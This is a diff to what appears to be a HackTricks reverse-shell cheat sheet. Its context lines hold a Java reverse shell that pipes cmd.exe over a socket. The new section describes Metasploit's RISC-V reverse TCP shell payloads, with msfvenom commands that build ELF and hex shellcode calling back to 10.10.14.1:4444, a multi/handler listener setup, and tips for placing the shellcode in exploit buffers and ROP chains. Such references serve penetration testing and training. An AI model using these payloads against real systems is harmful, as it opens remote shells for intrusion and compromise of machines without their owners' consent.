@@ -420,6 +420,28 @@ String cmd="cmd.exe";
 Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
 ```
 
+## RISC-V inline reverse TCP shells
+
+Metasploit 6.4.101 introduced single-stage reverse shells for both little-endian RISC-V architectures. `linux/riscv32le/shell_reverse_tcp` and `linux/riscv64le/shell_reverse_tcp` are position-independent shellcodes that open a TCP connection back to your handler, `dup2` the socket over stdin/stdout/stderr and `execve("/bin/sh")`—making them perfect droppers for memory-corruption exploits on emerging RISC-V appliances.
+
+Generate artifacts directly from msfvenom:
+
+```bash
+msfvenom -p linux/riscv64le/shell_reverse_tcp LHOST=10.10.14.1 LPORT=4444 -f elf -o shell_rv64
+msfvenom -p linux/riscv32le/shell_reverse_tcp LHOST=10.10.14.1 LPORT=4444 -f hex | sed 's/../\\x&/g'
+```
+
+The second command emits escaped shellcode bytes you can drop into a ROP chain. If you need a traditional handler:
+
+```text
+msfconsole > use exploit/multi/handler
+msfconsole > set payload linux/riscv64le/shell_reverse_tcp
+msfconsole > set LHOST 10.10.14.1
+msfconsole > run
+```
+
+Because the payloads are inline, no staging channel or filesystem write is required—just copy the bytes into your exploit buffer and trigger execution on the correct RISC-V bitness.
+
 ## References
 
 - [https://highon.coffee/blog/reverse-shell-cheat-sheet/](https://highon.coffee/blog/reverse-shell-cheat-sheet/)
@@ -428,5 +450,6 @@ Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new
 - [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
 - [https://github.com/robiot/rustcat](https://github.com/robiot/rustcat)
 - [https://github.com/emptymonkey/revsh](https://github.com/emptymonkey/revsh)
+- [Rapid7 – Metasploit Wrap-Up 12/05/2025](https://www.rapid7.com/blog/post/pt-metasploit-wrap-up-12-05-2025/)
 
 {{#include ../../banners/hacktricks-training.md}}
